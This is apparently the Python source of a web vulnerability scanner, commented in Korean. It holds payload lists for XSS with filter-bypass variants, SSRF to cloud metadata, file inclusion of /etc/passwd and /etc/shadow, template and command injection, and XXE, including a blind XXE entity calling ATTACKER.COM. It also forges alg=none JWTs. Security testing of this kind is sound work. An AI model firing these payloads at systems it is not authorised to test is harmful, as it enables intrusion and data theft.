"""
bingo Web Vulnerability Scanner
지원 취약점:
  - XSS (Reflected / Stored / DOM)
  - SSRF (Server-Side Request Forgery)
  - LFI / RFI (Local / Remote File Inclusion)
  - SSTI (Server-Side Template Injection)
  - Command Injection (OS)
  - XXE (XML External Entity)
  - Open Redirect
  - CORS Misconfiguration
  - IDOR (파라미터 변조)
  - Path Traversal
  - JWT 분석
"""
from __future__ import annotations
import re, time, base64, json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

try:
    import httpx as _httpx
    _CLIENT = _httpx.Client(follow_redirects=False, verify=False, timeout=10,
                            headers={"User-Agent": "Mozilla/5.0 (bingo-scanner/2.0)"})
    _CLIENT_FOLLOW = _httpx.Client(follow_redirects=True, verify=False, timeout=10)
except ImportError:
    _CLIENT = None
    _CLIENT_FOLLOW = None


# ── XSS 페이로드 ─────────────────────────────────────────────────
_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '{{7*7}}',                     # SSTI 겸용
    '${7*7}',                      # SSTI 겸용
    'javascript:alert(1)',
    '"onmouseover="alert(1)',
    '<body onload=alert(1)>',
    # WAF 우회 변형
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
]

# ── SSRF 페이로드 ─────────────────────────────────────────────────
_SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",       # AWS metadata
    "http://metadata.google.internal/",                # GCP metadata
    "http://169.254.169.254/metadata/v1/",             # DigitalOcean
    "http://169.254.169.254/computeMetadata/v1/",      # GCP alt
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://2130706433/",                              # 127.0.0.1 decimal
    "http://0177.0.0.1/",                             # 127.0.0.1 octal
    "http://0x7f000001/",                             # 127.0.0.1 hex
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/info",                     # Redis SSRF
    "gopher://127.0.0.1:3306/",                       # MySQL SSRF
    "http://internal.domain.local/",
]

# ── LFI 페이로드 ─────────────────────────────────────────────────
_LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
    "....//....//etc/passwd",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "C:/Windows/win.ini",
    "C:/boot.ini",
    "C:/Windows/system32/drivers/etc/hosts",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain,<?php phpinfo(); ?>",
    "expect://id",
    "/etc/hosts",
    "/etc/issue",
    "/etc/os-release",
]

# ── LFI 성공 시그니처 ─────────────────────────────────────────────
_LFI_SIGNATURES = [
    "root:x:0:0", "daemon:x:", "/bin/bash", "/bin/sh",
    "[boot loader]", "for 16-bit app support", "Windows Registry",
    "HTTP_USER_AGENT", "HTTP_HOST", "DOCUMENT_ROOT",
    "base64_decode", "eval(", "phpinfo()",
]

# ── SSTI 페이로드 ─────────────────────────────────────────────────
_SSTI_PAYLOADS = {
    "Jinja2/Twig":   [
        "{{7*7}}",                          # 49 반환되면 양성
        "{{7*'7'}}",                        # Jinja2: 7777777, Twig: 49
        "{{config}}",
        "{{self.__class__.__mro__[1].__subclasses__()}}",
    ],
    "FreeMarker":    ["${7*7}", "<#assign x=7*7>${x}"],
    "Velocity":      ["#set($x=7*7)${x}"],
    "ERB/Ruby":      ["<%= 7*7 %>"],
    "Smarty":        ["{php}echo 7*7;{/php}", "{math equation='7*7'}"],
    "Pebble":        ["{{7*7}}", "{% if 7==7 %}yes{% endif %}"],
    "Mako":          ["${7*7}"],
    "Thymeleaf":     ["[[${7*7}]]", "__${7*7}__::.x"],
}
_ALL_SSTI = [(name, p) for name, plist in _SSTI_PAYLOADS.items() for p in plist]

# ── Command Injection 페이로드 ────────────────────────────────────
_CMDI_PAYLOADS = [
    ";id",           ";whoami",       ";ls",
    "|id",           "|whoami",       "|ls",
    "&&id",          "&&whoami",      "&&ls",
    "`id`",          "`whoami`",
    "$(id)",         "$(whoami)",
    "\n/bin/id",
    "%0aid",         "%0a/bin/id",
    # Windows
    "&whoami",       "|dir",          "&&dir",
    ";ping -n 1 127.0.0.1",
    # 타임딜레이 (블라인드)
    "; sleep 5",     "| sleep 5",     "&& sleep 5",
    "; ping -c 5 127.0.0.1",
    "| timeout /T 5",
]
_CMDI_SIGNATURES = [
    r"uid=\d+\(", r"root:x:0:0", r"www-data", r"apache",
    r"daemon", r"\w+:\w+:\d+:\d+:", r"Directory of C:\\",
    r"Volume Serial Number",
]

# ── XXE 페이로드 ─────────────────────────────────────────────────
_XXE_PAYLOAD_LINUX = """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""

_XXE_PAYLOAD_WIN = """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>"""

_XXE_SSRF = """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>"""

_XXE_BLIND = """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://ATTACKER.COM/xxe.dtd">
  %dtd;
]>
<root/>"""

# ── Open Redirect 페이로드 ────────────────────────────────────────
_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "https:evil.com",
    "https://evil.com@legitimate.com",
    "https://legitimate.com.evil.com",
    "https://evil.com%2F@legitimate.com",
    "https://evil.com?legitimate.com",
    "https://evil.com#legitimate.com",
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
    "\x00https://evil.com",
    "https://evil.com%09",
]
_REDIRECT_PARAMS = ["redirect", "redirect_to", "redirect_url", "return",
                    "return_to", "return_url", "next", "url", "goto",
                    "target", "redir", "dest", "destination", "continue",
                    "forward", "location", "to", "link", "from", "ref"]


class WebScanner:
    """웹 취약점 스캐너."""

    def __init__(self, target_url: str):
        if not target_url.startswith("http"):
            target_url = "https://" + target_url
        self.target = target_url
        self.parsed = urlparse(target_url)
        self.qs = parse_qs(self.parsed.query, keep_blank_values=True)
        self.params = {k: v[0] for k, v in self.qs.items()}
        self.findings: list[dict] = []

    def _req(self, url: str, method: str = "GET", data: dict | None = None,
             headers: dict | None = None, body: str | None = None) -> tuple[int, str]:
        if _CLIENT is None:
            return 0, ""
        try:
            h = {"User-Agent": "Mozilla/5.0 (bingo-scanner/2.0)"}
            h.update(headers or {})
            if method == "POST":
                if body:
                    r = _CLIENT.post(url, content=body, headers=h)
                else:
                    r = _CLIENT_FOLLOW.post(url, data=data or {}, headers=h) if _CLIENT_FOLLOW else _CLIENT.post(url, data=data or {}, headers=h)
            else:
                r = _CLIENT.get(url, headers=h)
            return r.status_code, r.text
        except Exception as e:
            return 0, str(e)

    def _inject_url(self, param: str, payload: str) -> str:
        qs = dict(self.qs)
        qs[param] = [payload]
        return urlunparse((
            self.parsed.scheme, self.parsed.netloc, self.parsed.path,
            self.parsed.params, urlencode(qs, doseq=True), ""
        ))

    def _add_finding(self, vuln_type: str, detail: str, url: str, severity: str = "HIGH"):
        finding = {"type": vuln_type, "detail": detail, "url": url, "severity": severity}
        self.findings.append(finding)
        icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}.get(severity, "⚪")
        print(f"\n{icon} [{severity}] {vuln_type}")
        print(f"   → {detail}")
        print(f"   URL: {url[:120]}")

    # ── XSS 스캔 ─────────────────────────────────────────────────
    def scan_xss(self, params: list[str] | None = None) -> list[dict]:
        """Reflected XSS 스캔."""
        results = []
        targets = params or list(self.params.keys())
        if not targets:
            print("[XSS] No parameters found")
            return []

        print(f"[XSS] Testing {len(targets)} params × {len(_XSS_PAYLOADS)} payloads...")
        for param in targets:
            for payload in _XSS_PAYLOADS:
                url = self._inject_url(param, payload)
                status, body = self._req(url)
                # 페이로드가 이스케이프 없이 반영되면 양성
                if payload.lower() in body.lower() and status not in (0, 404):
                    detail = f"param={param}, payload={payload[:50]}"
                    self._add_finding("Reflected XSS", detail, url, "HIGH")
                    results.append({"param": param, "payload": payload, "url": url})
                    break  # 이 파라미터는 확인됨
        return results

    # ── SSRF 스캔 ─────────────────────────────────────────────────
    def scan_ssrf(self, params: list[str] | None = None) -> list[dict]:
        """SSRF 취약점 스캔."""
        results = []
        ssrf_params = params or [p for p in self.params.keys()
                                  if any(k in p.lower() for k in
                                         ["url", "uri", "link", "src", "href",
                                          "path", "file", "page", "img", "image",
                                          "redirect", "proxy", "fetch", "load"])]
        if not ssrf_params:
            ssrf_params = list(self.params.keys())

        print(f"[SSRF] Testing {len(ssrf_params)} params...")
        for param in ssrf_params:
            for payload in _SSRF_PAYLOADS[:8]:  # 상위 8개만
                url = self._inject_url(param, payload)
                status, body = self._req(url)
                aws_signs = ["ami-id", "instance-id", "local-ipv4", "placement"]
                if any(s in body.lower() for s in aws_signs):
                    self._add_finding("SSRF (AWS Metadata)", f"param={param}, payload={payload}",
                                      url, "CRITICAL")
                    results.append({"param": param, "payload": payload, "type": "aws_metadata"})
                elif "root:x:0:0" in body or "/bin/bash" in body:
                    self._add_finding("SSRF → LFI", f"param={param}, payload={payload}",
                                      url, "CRITICAL")
                    results.append({"param": param, "payload": payload, "type": "lfi_via_ssrf"})
                elif status == 200 and len(body) > 100 and "error" not in body.lower():
                    self._add_finding("Possible SSRF", f"param={param}, payload={payload}",
                                      url, "MEDIUM")
                    results.append({"param": param, "payload": payload, "type": "possible"})
        return results

    # ── LFI 스캔 ─────────────────────────────────────────────────
    def scan_lfi(self, params: list[str] | None = None) -> list[dict]:
        """LFI / Path Traversal 스캔."""
        results = []
        lfi_params = params or [p for p in self.params.keys()
                                 if any(k in p.lower() for k in
                                        ["file", "page", "path", "include", "template",
                                         "view", "load", "doc", "lang", "language"])]
        if not lfi_params:
            lfi_params = list(self.params.keys())

        print(f"[LFI] Testing {len(lfi_params)} params × {len(_LFI_PAYLOADS)} payloads...")
        for param in lfi_params:
            for payload in _LFI_PAYLOADS:
                url = self._inject_url(param, payload)
                status, body = self._req(url)
                for sig in _LFI_SIGNATURES:
                    if sig in body:
                        detail = f"param={param}, payload={payload}, signature={sig!r}"
                        self._add_finding("LFI/Path Traversal", detail, url, "CRITICAL")
                        results.append({"param": param, "payload": payload, "signature": sig, "url": url})
                        break
        return results

    # ── SSTI 스캔 ─────────────────────────────────────────────────
    def scan_ssti(self, params: list[str] | None = None) -> list[dict]:
        """Server-Side Template Injection 스캔."""
        results = []
        targets = params or list(self.params.keys())
        print(f"[SSTI] Testing {len(targets)} params...")

        for param in targets:
            for engine, payload in _ALL_SSTI:
                url = self._inject_url(param, payload)
                status, body = self._req(url)
                # {{7*7}} → 49 또는 7777777 반환
                if "49" in body or "7777777" in body:
                    detail = f"param={param}, engine={engine}, payload={payload!r}"
                    self._add_finding("SSTI", detail, url, "CRITICAL")
                    results.append({"param": param, "engine": engine, "payload": payload, "url": url})
                    break
        return results

    # ── Command Injection 스캔 ────────────────────────────────────
    def scan_cmdi(self, params: list[str] | None = None) -> list[dict]:
        """OS Command Injection 스캔."""
        results = []
        targets = params or list(self.params.keys())
        print(f"[CMDI] Testing {len(targets)} params...")

        for param in targets:
            for payload in _CMDI_PAYLOADS[:15]:  # 빠른 체크용
                url = self._inject_url(param, payload)

                # 타임딜레이 페이로드
                if "sleep" in payload or "ping" in payload or "timeout" in payload:
                    t0 = time.time()
                    status, body = self._req(url)
                    elapsed = time.time() - t0
                    if elapsed >= 4:
                        detail = f"param={param}, payload={payload!r}, delay={elapsed:.1f}s (blind CMDi)"
                        self._add_finding("Blind Command Injection", detail, url, "CRITICAL")
                        results.append({"param": param, "payload": payload, "type": "blind", "url": url})
                        break
                else:
                    status, body = self._req(url)
                    for sig in _CMDI_SIGNATURES:
                        if re.search(sig, body):
                            detail = f"param={param}, payload={payload!r}, signature={sig!r}"
                            self._add_finding("Command Injection", detail, url, "CRITICAL")
                            results.append({"param": param, "payload": payload, "type": "direct", "url": url})
                            break
        return results

    # ── XXE 스캔 ─────────────────────────────────────────────────
    def scan_xxe(self, endpoint: str | None = None) -> list[dict]:
        """XXE 취약점 스캔 (XML 엔드포인트 대상)."""
        results = []
        url = endpoint or self.target
        print(f"[XXE] Testing XML endpoint: {url}")

        for name, payload in [("Linux file read", _XXE_PAYLOAD_LINUX),
                               ("Windows file read", _XXE_PAYLOAD_WIN),
                               ("SSRF via XXE", _XXE_SSRF)]:
            status, body = self._req(url, method="POST", headers={
                "Content-Type": "application/xml"
            }, body=payload)
            for sig in _LFI_SIGNATURES + ["ami-id", "[fonts]", "for 16-bit"]:
                if sig in body:
                    detail = f"type={name}, signature={sig!r}"
                    self._add_finding("XXE", detail, url, "CRITICAL")
                    results.append({"type": name, "signature": sig, "url": url})
                    break
        return results

    # ── Open Redirect 스캔 ────────────────────────────────────────
    def scan_open_redirect(self) -> list[dict]:
        """Open Redirect 스캔."""
        results = []
        if _CLIENT is None:
            return []
        redirect_params = [p for p in self.params if p.lower() in _REDIRECT_PARAMS]
        if not redirect_params:
            redirect_params = list(self.params.keys())

        print(f"[REDIRECT] Testing {len(redirect_params)} params...")
        for param in redirect_params:
            for payload in _REDIRECT_PAYLOADS[:8]:
                url = self._inject_url(param, payload)
                try:
                    r = _CLIENT.get(url)
                    # 리다이렉트 헤더가 evil.com을 가리키면 양성
                    loc = r.headers.get("location", "")
                    if "evil.com" in loc or r.status_code in (301, 302, 303, 307, 308):
                        if "evil.com" in loc:
                            detail = f"param={param}, payload={payload!r} → Location: {loc}"
                            self._add_finding("Open Redirect", detail, url, "MEDIUM")
                            results.append({"param": param, "payload": payload, "location": loc})
                            break
                except Exception:
                    pass
        return results

    # ── CORS 분석 ────────────────────────────────────────────────
    def scan_cors(self) -> list[dict]:
        """CORS 설정 오류 스캔."""
        results = []
        if _CLIENT is None:
            return []
        origins = [
            "https://evil.com",
            "https://evil.com.legitimate.com",
            "null",
            "https://legitimate.evil.com",
        ]
        print(f"[CORS] Testing CORS misconfiguration...")
        for origin in origins:
            try:
                r = _CLIENT.get(self.target, headers={"Origin": origin})
                acao = r.headers.get("access-control-allow-origin", "")
                acac = r.headers.get("access-control-allow-credentials", "")
                if acao == origin or acao == "*":
                    severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
                    detail = (f"Origin: {origin} → ACAO: {acao}, "
                              f"Credentials: {acac}")
                    self._add_finding("CORS Misconfiguration", detail, self.target, severity)
                    results.append({"origin": origin, "acao": acao, "credentials": acac})
            except Exception:
                pass
        if not results:
            print("[CORS] No CORS issues found")
        return results

    # ── IDOR / Param 조작 ─────────────────────────────────────────
    def scan_idor(self, id_params: list[str] | None = None) -> list[dict]:
        """IDOR - ID 파라미터 조작 테스트."""
        results = []
        candidates = id_params or [p for p in self.params
                                    if any(k in p.lower() for k in
                                           ["id", "uid", "user", "account", "no", "num", "idx"])]
        if not candidates:
            print("[IDOR] No ID parameters found")
            return []

        print(f"[IDOR] Testing {len(candidates)} params...")
        for param in candidates:
            original_val = self.params.get(param, "1")
            original_url = self.target
            _, original_body = self._req(original_url)

            for test_id in ["0", "1", "2", "-1", "99999", "admin", "administrator"]:
                if test_id == original_val:
                    continue
                url = self._inject_url(param, test_id)
                status, body = self._req(url)
                # 응답이 다르고 성공적이면 IDOR 가능성
                if status == 200 and body != original_body and len(body) > 100:
                    if abs(len(body) - len(original_body)) > 50:
                        detail = f"param={param}, original={original_val!r} → test={test_id!r} (diff={abs(len(body)-len(original_body))}B)"
                        self._add_finding("Possible IDOR", detail, url, "HIGH")
                        results.append({"param": param, "test_id": test_id, "url": url})
        return results

    # ── JWT 분석 ────────────────────────────────────────────────
    def analyze_jwt(self, token: str) -> dict:
        """JWT 토큰 분석 및 취약점 체크."""
        result = {"token": token, "issues": []}
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return {"error": "Not a valid JWT"}

            def b64_decode(s: str) -> str:
                s += "=" * (4 - len(s) % 4)
                return base64.urlsafe_b64decode(s).decode("utf-8", errors="replace")

            header  = json.loads(b64_decode(parts[0]))
            payload = json.loads(b64_decode(parts[1]))

            result["header"]  = header
            result["payload"] = payload

            print(f"[JWT] Algorithm: {header.get('alg', '?')}")
            print(f"[JWT] Payload: {payload}")

            # 취약점 체크
            alg = header.get("alg", "").lower()

            if alg == "none":
                result["issues"].append("CRITICAL: alg=none — signature not verified!")
                print("🔴 [JWT] CRITICAL: alg=none!")

            if alg.startswith("hs") and "kid" in header:
                result["issues"].append("HIGH: kid header present — possible SQLi/path traversal via kid")
                print("🟠 [JWT] kid injection possible")

            if alg.startswith("rs"):
                result["issues"].append("MEDIUM: RSA — try algorithm confusion (RS256→HS256)")
                print("🟡 [JWT] Algorithm confusion attack possible")

            import time as _time
            exp = payload.get("exp", None)
            if exp and _time.time() > exp:
                result["issues"].append("LOW: Token is expired but may still be accepted")

            if not exp:
                result["issues"].append("MEDIUM: No expiration (exp claim missing)")

            # None 알고리즘 공격 시도
            forged_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            forged_payload_b64 = parts[1]
            forged_token = f"{forged_header}.{forged_payload_b64}."
            result["forged_none_token"] = forged_token
            print(f"[JWT] Forged (alg=none): {forged_token[:80]}...")

        except Exception as e:
            result["error"] = str(e)

        return result

    # ── 전체 스캔 자동화 ─────────────────────────────────────────
    def scan_all(self, include_slow: bool = False) -> list[dict]:
        """모든 웹 취약점 자동 스캔."""
        print(f"\n{'='*50}")
        print(f"[WEB SCAN] {self.target}")
        print(f"[WEB SCAN] Params: {list(self.params.keys())}")
        print(f"{'='*50}")

        self.scan_cors()
        self.scan_open_redirect()

        if self.params:
            self.scan_xss()
            self.scan_ssrf()
            self.scan_lfi()
            self.scan_ssti()
            self.scan_cmdi()
            self.scan_idor()

        if include_slow:
            self.scan_xxe()

        print(f"\n[WEB SCAN] Complete. Found {len(self.findings)} issues.")
        for f in self.findings:
            icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}.get(f["severity"], "⚪")
            print(f"  {icon} {f['type']}: {f['detail'][:80]}")
        return self.findings
